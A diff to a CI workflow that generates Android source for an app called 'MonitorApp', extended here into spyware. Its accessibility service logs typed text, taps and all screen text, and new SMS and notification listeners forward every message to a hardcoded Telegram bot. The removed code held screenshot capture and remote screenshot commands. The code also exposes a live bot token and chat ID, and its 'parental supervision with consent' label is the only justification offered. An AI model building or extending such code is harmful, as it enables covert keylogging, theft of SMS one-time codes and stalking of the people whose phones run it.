@@ -114,6 +114,8 @@ jobs:
               package="com.example.monitorapp">
 
               <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.READ_SMS" />
+              <uses-permission android:name="android.permission.RECEIVE_SMS" />
 
               <application
                   android:allowBackup="true"
@@ -142,6 +144,24 @@ jobs:
                           android:resource="@xml/accessibility_config" />
                   </service>
 
+                  <service
+                      android:name=".NotificationMonitor"
+                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+                      android:exported="false">
+                      <intent-filter>
+                          <action android:name="android.service.notification.NotificationListenerService" />
+                      </intent-filter>
+                  </service>
+
+                  <receiver
+                      android:name=".SMSReceiver"
+                      android:exported="true"
+                      android:permission="android.permission.BROADCAST_SMS">
+                      <intent-filter>
+                          <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                      </intent-filter>
+                  </receiver>
+
               </application>
           </manifest>
           EOF
@@ -149,50 +169,70 @@ jobs:
           cat > app/src/main/java/com/example/monitorapp/MainActivity.java << 'EOF'
           package com.example.monitorapp;
 
+          import android.Manifest;
+          import android.content.Intent;
+          import android.content.pm.PackageManager;
+          import android.net.Uri;
           import android.os.Bundle;
-          import android.webkit.WebSettings;
-          import android.webkit.WebView;
-          import android.webkit.WebViewClient;
+          import android.provider.Settings;
+          import android.widget.Button;
+          import android.widget.Toast;
+          import androidx.annotation.NonNull;
           import androidx.appcompat.app.AppCompatActivity;
+          import androidx.core.app.ActivityCompat;
+          import androidx.core.content.ContextCompat;
 
           public class MainActivity extends AppCompatActivity {
 
-              private WebView webView;
+              private static final int SMS_PERMISSION_CODE = 100;
 
               @Override
               protected void onCreate(Bundle savedInstanceState) {
                   super.onCreate(savedInstanceState);
                   setContentView(R.layout.activity_main);
 
-                  webView = findViewById(R.id.webView);
+                  Button btnGrantNotification = findViewById(R.id.btnGrantNotification);
+                  Button btnGrantSms = findViewById(R.id.btnGrantSms);
+                  Button btnOpenWeb = findViewById(R.id.btnOpenWeb);
 
-                  WebSettings webSettings = webView.getSettings();
-                  webSettings.setJavaScriptEnabled(true);
-                  webSettings.setDomStorageEnabled(true);
-                  webSettings.setLoadWithOverviewMode(true);
-                  webSettings.setUseWideViewPort(true);
-                  webSettings.setBuiltInZoomControls(true);
-                  webSettings.setDisplayZoomControls(false);
-                  webSettings.setSupportZoom(true);
-                  webSettings.setJavaScriptCanOpenWindowsAutomatically(true);
+                  btnGrantNotification.setOnClickListener(v -> {
+                      Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
+                      startActivity(intent);
+                  });
 
-                  webView.setWebViewClient(new WebViewClient() {
-                      @Override
-                      public boolean shouldOverrideUrlLoading(WebView view, String url) {
-                          view.loadUrl(url);
-                          return true;
+                  btnGrantSms.setOnClickListener(v -> {
+                      if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
+                              ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
+                          ActivityCompat.requestPermissions(this,
+                                  new String[]{Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS},
+                                  SMS_PERMISSION_CODE);
+                      } else {
+                          Toast.makeText(this, "SMS permission already granted", Toast.LENGTH_SHORT).show();
                       }
                   });
 
-                  webView.loadUrl("https://neon-aim.vercel.app/");
+                  btnOpenWeb.setOnClickListener(v -> {
+                      Intent webIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://neon-aim.vercel.app/"));
+                      startActivity(webIntent);
+                  });
+
+                  if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
+                          ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
+                      ActivityCompat.requestPermissions(this,
+                              new String[]{Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS},
+                              SMS_PERMISSION_CODE);
+                  }
               }
 
               @Override
-              public void onBackPressed() {
-                  if (webView.canGoBack()) {
-                      webView.goBack();
-                  } else {
-                      super.onBackPressed();
+              public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+                  super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+                  if (requestCode == SMS_PERMISSION_CODE) {
+                      if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                          Toast.makeText(this, "SMS permission granted", Toast.LENGTH_SHORT).show();
+                      } else {
+                          Toast.makeText(this, "SMS permission denied", Toast.LENGTH_SHORT).show();
+                      }
                   }
               }
           }
@@ -202,23 +242,12 @@ jobs:
           package com.example.monitorapp;
 
           import android.accessibilityservice.AccessibilityService;
-          import android.graphics.Bitmap;
-          import android.graphics.ColorSpace;
-          import android.hardware.HardwareBuffer;
-          import android.os.Build;
-          import android.os.Handler;
-          import android.os.Looper;
-          import android.view.Display;
           import android.view.accessibility.AccessibilityEvent;
           import android.view.accessibility.AccessibilityNodeInfo;
-          import org.json.JSONArray;
-          import org.json.JSONObject;
           import java.io.File;
-          import java.io.FileOutputStream;
           import java.io.FileWriter;
           import java.io.IOException;
           import java.util.concurrent.TimeUnit;
-          import okhttp3.MediaType;
           import okhttp3.MultipartBody;
           import okhttp3.OkHttpClient;
           import okhttp3.Request;
@@ -232,42 +261,26 @@ jobs:
 
               private static final String TELEGRAM_API = "https://api.telegram.org/bot" + BOT_TOKEN;
 
-              private Handler screenshotHandler = new Handler(Looper.getMainLooper());
-              private Runnable screenshotRunnable = this::takeScreenshotAndSend;
-
               private OkHttpClient httpClient = new OkHttpClient.Builder()
                       .connectTimeout(15, TimeUnit.SECONDS)
                       .readTimeout(15, TimeUnit.SECONDS)
                       .build();
 
-              private int lastUpdateId = 0;
-              private Thread pollingThread;
-
-              @Override
-              public void onServiceConnected() {
-                  super.onServiceConnected();
-                  startTelegramPolling();
-              }
-
               @Override
               public void onAccessibilityEvent(AccessibilityEvent event) {
                   String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";
-                  String eventType = "";
 
                   switch (event.getEventType()) {
                       case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
-                          eventType = "📝 Typed";
                           CharSequence typedText = event.getText() != null && event.getText().size() > 0 ? event.getText().get(0) : "";
                           if (typedText != null && typedText.length() > 0) {
                               String log = "[" + packageName + "] " + typedText;
                               logToFile("[" + System.currentTimeMillis() + "] " + log);
                               sendTextToTelegram("📝 [" + packageName + "] " + typedText);
-                              scheduleScreenshot();
                           }
                           break;
 
                       case AccessibilityEvent.TYPE_VIEW_CLICKED:
-                          eventType = "👆 Tapped";
                           AccessibilityNodeInfo source = event.getSource();
                           String clickedText = "";
                           if (source != null) {
@@ -280,7 +293,6 @@ jobs:
                           break;
 
                       case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
-                          eventType = "🖥️ ScreenText";
                           if (event.getText() != null && event.getText().size() > 0) {
                               StringBuilder sb = new StringBuilder();
                               for (CharSequence cs : event.getText()) {
@@ -288,18 +300,21 @@ jobs:
                                       sb.append(cs).append(" | ");
                                   }
                               }
-                              if (sb.length() > 0) {
-                                  String screenText = sb.toString().trim();
-                                  if (screenText.length() > 5) { // ignore too short
-                                      sendTextToTelegram("🖥️ [" + packageName + "] " + screenText);
-                                  }
+                              String screenText = sb.toString().trim();
+                              if (screenText.length() > 3) {
+                                  sendTextToTelegram("🖥️ [" + packageName + "] " + screenText);
                               }
                           }
                           break;
 
                       case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
-                          // Optional: capture content changes but avoid too many messages
-                          // We skip for now to reduce spam
+                          AccessibilityNodeInfo root = getRootInActiveWindow();
+                          if (root != null) {
+                              String allText = extractTextFromNode(root);
+                              if (allText.length() > 3) {
+                                  sendTextToTelegram("📄 [" + packageName + "] " + allText);
+                              }
+                          }
                           break;
 
                       default:
@@ -307,56 +322,27 @@ jobs:
                   }
               }
 
+              private String extractTextFromNode(AccessibilityNodeInfo node) {
+                  StringBuilder sb = new StringBuilder();
+                  if (node == null) return sb.toString();
+                  if (node.getText() != null) {
+                      sb.append(node.getText().toString()).append(" | ");
+                  }
+                  if (node.getContentDescription() != null) {
+                      sb.append(node.getContentDescription().toString()).append(" | ");
+                  }
+                  for (int i = 0; i < node.getChildCount(); i++) {
+                      AccessibilityNodeInfo child = node.getChild(i);
+                      if (child != null) {
+                          sb.append(extractTextFromNode(child));
+                          child.recycle();
+                      }
+                  }
+                  return sb.toString();
+              }
+
               @Override
               public void onInterrupt() {
-              }
-
-              @Override
-              public void onDestroy() {
-                  super.onDestroy();
-                  if (pollingThread != null && pollingThread.isAlive()) {
-                      pollingThread.interrupt();
-                  }
-              }
-
-              private void scheduleScreenshot() {
-                  screenshotHandler.removeCallbacks(screenshotRunnable);
-                  screenshotHandler.postDelayed(screenshotRunnable, 2000);
-              }
-
-              private void takeScreenshotAndSend() {
-                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                      takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(),
-                              new TakeScreenshotCallback() {
-                                  @Override
-                                  public void onSuccess(ScreenshotResult screenshotResult) {
-                                      HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
-                                      ColorSpace colorSpace = screenshotResult.getColorSpace();
-                                      Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace);
-                                      if (bitmap != null) {
-                                          File screenshotFile = saveBitmap(bitmap);
-                                          sendPhotoToTelegram(screenshotFile, "📸 Screenshot taken after typing");
-                                      }
-                                      screenshotResult.getHardwareBuffer().close();
-                                  }
-
-                                  @Override
-                                  public void onFailure(int errorCode) {
-                                  }
-                              });
-                  }
-              }
-
-              private File saveBitmap(Bitmap bitmap) {
-                  File dir = new File(getExternalFilesDir(null), "screenshots");
-                  if (!dir.exists()) dir.mkdirs();
-                  File file = new File(dir, "screenshot_" + System.currentTimeMillis() + ".png");
-                  try (FileOutputStream fos = new FileOutputStream(file)) {
-                      bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
-                  } catch (IOException e) {
-                      e.printStackTrace();
-                  }
-                  return file;
               }
 
               private void sendTextToTelegram(String message) {
@@ -379,76 +365,6 @@ jobs:
                   }).start();
               }
 
-              private void sendPhotoToTelegram(File photoFile, String caption) {
-                  new Thread(() -> {
-                      try {
-                          String url = TELEGRAM_API + "/sendPhoto";
-                          RequestBody body = new MultipartBody.Builder()
-                                  .setType(MultipartBody.FORM)
-                                  .addFormDataPart("chat_id", CHAT_ID)
-                                  .addFormDataPart("caption", caption)
-                                  .addFormDataPart("photo", photoFile.getName(),
-                                          RequestBody.create(MediaType.parse("image/png"), photoFile))
-                                  .build();
-                          Request request = new Request.Builder()
-                                  .url(url)
-                                  .post(body)
-                                  .build();
-                          httpClient.newCall(request).execute().close();
-                      } catch (IOException e) {
-                          e.printStackTrace();
-                      }
-                  }).start();
-              }
-
-              private void startTelegramPolling() {
-                  pollingThread = new Thread(() -> {
-                      while (!Thread.currentThread().isInterrupted()) {
-                          try {
-                              checkForCommands();
-                              Thread.sleep(15000);
-                          } catch (InterruptedException e) {
-                              Thread.currentThread().interrupt();
-                              break;
-                          } catch (Exception e) {
-                              e.printStackTrace();
-                          }
-                      }
-                  });
-                  pollingThread.setDaemon(true);
-                  pollingThread.start();
-              }
-
-              private void checkForCommands() {
-                  try {
-                      String url = TELEGRAM_API + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=0";
-                      Request request = new Request.Builder().url(url).build();
-                      Response response = httpClient.newCall(request).execute();
-                      if (!response.isSuccessful()) return;
-
-                      String jsonStr = response.body().string();
-                      JSONObject json = new JSONObject(jsonStr);
-                      JSONArray updates = json.getJSONArray("result");
-
-                      for (int i = 0; i < updates.length(); i++) {
-                          JSONObject update = updates.getJSONObject(i);
-                          lastUpdateId = update.getInt("update_id");
-
-                          if (update.has("message")) {
-                              JSONObject message = update.getJSONObject("message");
-                              if (message.has("text")) {
-                                  String text = message.getString("text");
-                                  if (text.equalsIgnoreCase("/screenshot")) {
-                                      screenshotHandler.post(this::takeScreenshotAndSend);
-                                  }
-                              }
-                          }
-                      }
-                  } catch (Exception e) {
-                      e.printStackTrace();
-                  }
-              }
-
               private void logToFile(String data) {
                   File dir = new File(getExternalFilesDir(null), "logs");
                   if (!dir.exists()) dir.mkdirs();
@@ -462,24 +378,179 @@ jobs:
           }
           EOF
 
+          cat > app/src/main/java/com/example/monitorapp/NotificationMonitor.java << 'EOF'
+          package com.example.monitorapp;
+
+          import android.service.notification.NotificationListenerService;
+          import android.service.notification.StatusBarNotification;
+          import android.os.Bundle;
+          import java.io.IOException;
+          import java.util.concurrent.TimeUnit;
+          import okhttp3.MultipartBody;
+          import okhttp3.OkHttpClient;
+          import okhttp3.Request;
+          import okhttp3.RequestBody;
+          import okhttp3.Response;
+
+          public class NotificationMonitor extends NotificationListenerService {
+
+              private static final String BOT_TOKEN = "8604384479:AAE5NriMLZzQNHvqE5U-SpSiegtn_Trp0SQ";
+              private static final String CHAT_ID = "8534616003";
+              private static final String TELEGRAM_API = "https://api.telegram.org/bot" + BOT_TOKEN;
+
+              private OkHttpClient httpClient = new OkHttpClient.Builder()
+                      .connectTimeout(15, TimeUnit.SECONDS)
+                      .readTimeout(15, TimeUnit.SECONDS)
+                      .build();
+
+              @Override
+              public void onNotificationPosted(StatusBarNotification sbn) {
+                  String packageName = sbn.getPackageName();
+                  String appName = packageName;
+                  try {
+                      appName = getPackageManager().getApplicationLabel(
+                              getPackageManager().getApplicationInfo(packageName, 0)).toString();
+                  } catch (Exception e) {
+                  }
+
+                  android.app.Notification notification = sbn.getNotification();
+                  Bundle extras = notification.extras;
+                  String title = extras.getString(android.app.Notification.EXTRA_TITLE, "");
+                  String text = extras.getString(android.app.Notification.EXTRA_TEXT, "");
+
+                  String message = "📩 Notification from " + appName + " (" + packageName + ")\n"
+                          + "Title: " + title + "\n"
+                          + "Text: " + text;
+
+                  sendTextToTelegram(message);
+              }
+
+              @Override
+              public void onNotificationRemoved(StatusBarNotification sbn) {
+              }
+
+              private void sendTextToTelegram(String message) {
+                  new Thread(() -> {
+                      try {
+                          String url = TELEGRAM_API + "/sendMessage";
+                          RequestBody body = new MultipartBody.Builder()
+                                  .setType(MultipartBody.FORM)
+                                  .addFormDataPart("chat_id", CHAT_ID)
+                                  .addFormDataPart("text", message)
+                                  .build();
+                          Request request = new Request.Builder()
+                                  .url(url)
+                                  .post(body)
+                                  .build();
+                          httpClient.newCall(request).execute().close();
+                      } catch (IOException e) {
+                          e.printStackTrace();
+                      }
+                  }).start();
+              }
+          }
+          EOF
+
+          cat > app/src/main/java/com/example/monitorapp/SMSReceiver.java << 'EOF'
+          package com.example.monitorapp;
+
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.os.Bundle;
+          import android.telephony.SmsMessage;
+          import java.io.IOException;
+          import java.util.concurrent.TimeUnit;
+          import okhttp3.MultipartBody;
+          import okhttp3.OkHttpClient;
+          import okhttp3.Request;
+          import okhttp3.RequestBody;
+          import okhttp3.Response;
+
+          public class SMSReceiver extends BroadcastReceiver {
+
+              private static final String BOT_TOKEN = "8604384479:AAE5NriMLZzQNHvqE5U-SpSiegtn_Trp0SQ";
+              private static final String CHAT_ID = "8534616003";
+              private static final String TELEGRAM_API = "https://api.telegram.org/bot" + BOT_TOKEN;
+
+              @Override
+              public void onReceive(Context context, Intent intent) {
+                  if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
+                      Bundle bundle = intent.getExtras();
+                      if (bundle != null) {
+                          Object[] pdus = (Object[]) bundle.get("pdus");
+                          if (pdus != null) {
+                              for (Object pdu : pdus) {
+                                  SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
+                                  String sender = sms.getDisplayOriginatingAddress();
+                                  String messageBody = sms.getMessageBody();
+                                  String fullMessage = "💬 SMS from " + sender + ": " + messageBody;
+                                  sendTextToTelegram(fullMessage);
+                              }
+                          }
+                      }
+                  }
+              }
+
+              private void sendTextToTelegram(String message) {
+                  new Thread(() -> {
+                      try {
+                          String url = TELEGRAM_API + "/sendMessage";
+                          RequestBody body = new MultipartBody.Builder()
+                                  .setType(MultipartBody.FORM)
+                                  .addFormDataPart("chat_id", CHAT_ID)
+                                  .addFormDataPart("text", message)
+                                  .build();
+                          Request request = new Request.Builder()
+                                  .url(url)
+                                  .post(body)
+                                  .build();
+                          OkHttpClient client = new OkHttpClient.Builder()
+                                  .connectTimeout(15, TimeUnit.SECONDS)
+                                  .readTimeout(15, TimeUnit.SECONDS)
+                                  .build();
+                          client.newCall(request).execute().close();
+                      } catch (IOException e) {
+                          e.printStackTrace();
+                      }
+                  }).start();
+              }
+          }
+          EOF
+
           cat > app/src/main/res/layout/activity_main.xml << 'EOF'
           <?xml version="1.0" encoding="utf-8"?>
           <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
               android:layout_width="match_parent"
               android:layout_height="match_parent"
-              android:orientation="vertical">
+              android:orientation="vertical"
+              android:padding="16dp">
 
-              <WebView
-                  android:id="@+id/webView"
+              <Button
+                  android:id="@+id/btnGrantNotification"
                   android:layout_width="match_parent"
-                  android:layout_height="match_parent" />
+                  android:layout_height="wrap_content"
+                  android:text="Grant Notification Access" />
+
+              <Button
+                  android:id="@+id/btnGrantSms"
+                  android:layout_width="match_parent"
+                  android:layout_height="wrap_content"
+                  android:text="Grant SMS Permission" />
+
+              <Button
+                  android:id="@+id/btnOpenWeb"
+                  android:layout_width="match_parent"
+                  android:layout_height="wrap_content"
+                  android:text="Open Web Dashboard" />
+
           </LinearLayout>
           EOF
 
           cat > app/src/main/res/values/strings.xml << 'EOF'
           <resources>
               <string name="app_name">MonitorApp</string>
-              <string name="accessibility_service_description">This service monitors typed text, screen content, and captures screenshots for parental supervision with consent.</string>
+              <string name="accessibility_service_description">This service monitors typed text, screen content, taps, and notifications for parental supervision with consent.</string>
           </resources>
           EOF
 
@@ -492,10 +563,9 @@ jobs:
           cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
           <?xml version="1.0" encoding="utf-8"?>
           <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-              android:accessibilityEventTypes="typeViewTextChanged|typeWindowStateChanged|typeWindowContentChanged|typeViewClicked"
+              android:accessibilityEventTypes="typeViewTextChanged|typeWindowStateChanged|typeWindowContentChanged|typeViewClicked|typeViewScrolled"
               android:accessibilityFeedbackType="feedbackGeneric"
-              android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds|flagRequestAccessibilityButton"
-              android:canTakeScreenshot="true"
+              android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds|flagRetrieveInteractiveWindows"
               android:notificationTimeout="100"
               android:description="@string/accessibility_service_description" />
           EOF
